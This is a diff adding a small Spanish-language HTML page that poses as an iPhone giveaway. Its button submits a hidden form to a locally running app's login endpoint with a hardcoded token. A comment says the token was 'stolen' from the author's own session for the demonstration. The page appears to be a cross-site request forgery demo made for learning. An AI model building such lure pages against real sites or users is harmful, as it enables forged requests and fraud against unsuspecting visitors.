@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Web de Regalos Gratis</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            text-align: center;
+            padding-top: 50px;
+        }
+
+        .box {
+            border: 2px solid red;
+            display: inline-block;
+            padding: 20px;
+            background: #fff0f0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="box">
+        <h1>¡HAS GANADO UN IPHONE!</h1>
+        <p>Haz clic en el botón para reclamar tu premio.</p>
+
+
+        <form action="http://127.0.0.1:8000/login" method="POST">
+            <!--   falta de token dara error . Para la demostración he 'robado' mi propio token -->
+
+
+            <input type="hidden" name="_token" value="7242rpPNj1a16hmUSNdCbXhP93ATz2oARrLpDS0A">
+            <button type="submit"
+                style="padding: 10px 20px; background: red; color: white; border: none; cursor: pointer;">
+                RECLAMAR PREMIO
+            </button>
+        </form>
+    </div>
+</body>
+
+</html>
